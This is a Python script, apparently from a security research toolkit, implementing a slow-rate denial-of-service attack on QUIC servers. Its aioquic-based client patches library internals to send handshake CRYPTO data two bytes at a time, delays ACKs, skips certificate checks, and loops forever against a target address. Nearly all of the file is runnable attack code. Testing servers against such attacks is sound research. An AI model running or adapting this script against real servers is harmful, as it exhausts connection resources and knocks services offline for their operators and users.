import asyncio
import logging
import os
from pathlib import Path
import sys
from typing import Optional
from aioquic.quic.connection import QuicConnection, QuicNetworkPath
import ssl
from aioquic.asyncio import connect
from aioquic.h3.connection import H3_ALPN
from aioquic import tls
from aioquic.tls import Epoch
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.packet import QuicFrameType, QuicPacketType
from aioquic.quic.packet_builder import QuicPacketBuilder, QuicPacketBuilderStop
from aioquic.quic.stream import QuicStream
import click
from utils import attack_command, calculate_slowrate_wait_time

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S', stream=sys.stdout)


class HandshakeSlowRateClient(QuicConnectionProtocol):
    def __init__(self, quic: QuicConnection, *args, **kwargs):
        def _push_crypto_data():
            for epoch, buf in quic._crypto_buffers.items():
                data = buf.data
                buf.seek(0)
                if epoch == Epoch.INITIAL:
                    chunk_size = 2
                    buf.push_bytes(data[chunk_size:])
                    quic._crypto_streams[epoch].sender.write(data[:chunk_size])
                    logging.info(f'Sending CRYPTO stream part: {data[:chunk_size]}')
                else:
                    quic._crypto_streams[epoch].sender.write(data)
        quic._push_crypto_data = _push_crypto_data

        def _write_application(builder: QuicPacketBuilder, network_path: QuicNetworkPath, now: float):
            self = quic
            crypto_stream: Optional[QuicStream] = None
            if self._cryptos[tls.Epoch.ONE_RTT].send.is_valid():
                crypto = self._cryptos[tls.Epoch.ONE_RTT]
                crypto_stream = self._crypto_streams[tls.Epoch.ONE_RTT]
                packet_type = QuicPacketType.ONE_RTT
                space = self._spaces[tls.Epoch.ONE_RTT]
            elif self._cryptos[tls.Epoch.ZERO_RTT].send.is_valid():
                crypto = self._cryptos[tls.Epoch.ZERO_RTT]
                packet_type = QuicPacketType.ZERO_RTT
                space = self._spaces[tls.Epoch.ONE_RTT]
            elif self._cryptos[tls.Epoch.INITIAL].send.is_valid():
                crypto = self._cryptos[tls.Epoch.INITIAL]
                crypto_stream = self._crypto_streams[tls.Epoch.INITIAL]
                packet_type = QuicPacketType.INITIAL
                space = self._spaces[tls.Epoch.INITIAL]
            else:
                return

            while True:
                # apply pacing, except if we have ACKs to send
                if space.ack_at is None or space.ack_at >= now:
                    self._pacing_at = self._loss._pacer.next_send_time(now=now)
                    if self._pacing_at is not None:
                        break
                builder.start_packet(packet_type, crypto)

                # ACK
                if space.ack_at is not None and space.ack_at <= now:
                    self._write_ack_frame(builder=builder, space=space, now=now)

                if self._handshake_complete:
                    # HANDSHAKE_DONE
                    if self._handshake_done_pending:
                        self._write_handshake_done_frame(builder=builder)
                        self._handshake_done_pending = False

                    # PATH CHALLENGE
                    if not (network_path.is_validated or network_path.local_challenge_sent):
                        challenge = os.urandom(8)
                        self._add_local_challenge(
                            challenge=challenge, network_path=network_path
                        )
                        self._write_path_challenge_frame(
                            builder=builder, challenge=challenge
                        )
                        network_path.local_challenge_sent = True

                    # PATH RESPONSE
                    while len(network_path.remote_challenges) > 0:
                        challenge = network_path.remote_challenges.popleft()
                        self._write_path_response_frame(
                            builder=builder, challenge=challenge
                        )

                    # NEW_CONNECTION_ID
                    for connection_id in self._host_cids:
                        if not connection_id.was_sent:
                            self._write_new_connection_id_frame(
                                builder=builder, connection_id=connection_id
                            )

                    # RETIRE_CONNECTION_ID
                    for sequence_number in self._retire_connection_ids[:]:
                        self._write_retire_connection_id_frame(
                            builder=builder, sequence_number=sequence_number
                        )
                        self._retire_connection_ids.pop(0)

                    # STREAMS_BLOCKED
                    if self._streams_blocked_pending:
                        if self._streams_blocked_bidi:
                            self._write_streams_blocked_frame(
                                builder=builder,
                                frame_type=QuicFrameType.STREAMS_BLOCKED_BIDI,
                                limit=self._remote_max_streams_bidi,
                            )
                        if self._streams_blocked_uni:
                            self._write_streams_blocked_frame(
                                builder=builder,
                                frame_type=QuicFrameType.STREAMS_BLOCKED_UNI,
                                limit=self._remote_max_streams_uni,
                            )
                        self._streams_blocked_pending = False

                    # MAX_DATA and MAX_STREAMS
                    self._write_connection_limits(builder=builder, space=space)

                 # stream-level limits
                for stream in self._streams.values():
                    self._write_stream_limits(builder=builder, space=space, stream=stream)

                # PING (user-request)
                if self._ping_pending:
                    self._write_ping_frame(builder, self._ping_pending)
                    self._ping_pending.clear()

                # PING (probe)
                if self._probe_pending:
                    self._write_ping_frame(builder, comment="probe")
                    self._probe_pending = False

                # CRYPTO
                if crypto_stream is not None and not crypto_stream.sender.buffer_is_empty:
                    self._write_crypto_frame(
                        builder=builder, space=space, stream=crypto_stream
                    )

                # DATAGRAM
                while self._datagrams_pending:
                    try:
                        self._write_datagram_frame(
                            builder=builder,
                            data=self._datagrams_pending[0],
                            frame_type=QuicFrameType.DATAGRAM_WITH_LENGTH,
                        )
                        self._datagrams_pending.popleft()
                    except QuicPacketBuilderStop:
                        break

                sent: set[QuicStream] = set()
                discarded: set[QuicStream] = set()
                try:
                    for stream in self._streams_queue:
                        # if the stream is finished, discard it
                        if stream.is_finished:
                            self._logger.debug("Stream %d discarded", stream.stream_id)
                            self._streams.pop(stream.stream_id)
                            self._streams_finished.add(stream.stream_id)
                            discarded.add(stream)
                            continue

                        if stream.receiver.stop_pending:
                            # STOP_SENDING
                            self._write_stop_sending_frame(builder=builder, stream=stream)

                        if stream.sender.reset_pending:
                            # RESET_STREAM
                            self._write_reset_stream_frame(builder=builder, stream=stream)
                        elif not stream.is_blocked and not stream.sender.buffer_is_empty:
                            # STREAM
                            used = self._write_stream_frame(
                                builder=builder,
                                space=space,
                                stream=stream,
                                max_offset=min(
                                    stream.sender.highest_offset
                                    + self._remote_max_data
                                    - self._remote_max_data_used,
                                    stream.max_stream_data_remote,
                                ),
                            )
                            self._remote_max_data_used += used
                            if used > 0:
                                sent.add(stream)

                finally:
                    # Make a new stream service order, putting served ones at the end.
                    #
                    # This method of updating the streams queue ensures that discarded
                    # streams are removed and ones which sent are moved to the end even
                    # if an exception occurs in the loop.
                    self._streams_queue = [
                        stream
                        for stream in self._streams_queue
                        if not (stream in discarded or stream in sent)
                    ]
                    self._streams_queue.extend(sent)

                if builder.packet_is_empty:
                    break
                else:
                    self._loss._pacer.update_after_send(now=now)
        quic._write_application = _write_application

        super().__init__(quic, *args, **kwargs)

    def datagram_received(self, data, addr):
        # Set address validation as completed
        # aioquic only does this upon receiving a HANDSHAKE packet, but not for INITIAL ones
        # This results in unnecessary PING frames being sent
        self._quic._loss.peer_completed_address_validation = True

        # Send ACK in some seconds
        space = self._quic._spaces[Epoch.INITIAL]
        if space.ack_at is None:
            space.ack_at = self._loop.time() + 10

        return super().datagram_received(data, addr)


@attack_command(decorators=[click.option('--alpn', default=H3_ALPN[0], help='ALPN protocol to use')])
async def main(addr, alpn=H3_ALPN[0], debug=False, *args, **kwargs):
    while True:
        async with connect(
            host=addr[0],
            port=addr[1],
            configuration=QuicConfiguration(
                alpn_protocols=[alpn],
                verify_mode=ssl.VerifyMode.CERT_NONE,
                secrets_log_file=(Path(__file__).parent.parent / 'quic_secrets.log').open('a') if debug else None,
            ),
            create_protocol=HandshakeSlowRateClient,
            wait_connected=False,
        ) as c:
            while not c._quic._handshake_complete:
                await asyncio.sleep(calculate_slowrate_wait_time(c._quic, time=20))
                c._quic._push_crypto_data()
                c.transmit()


if __name__ == '__main__':
    main()
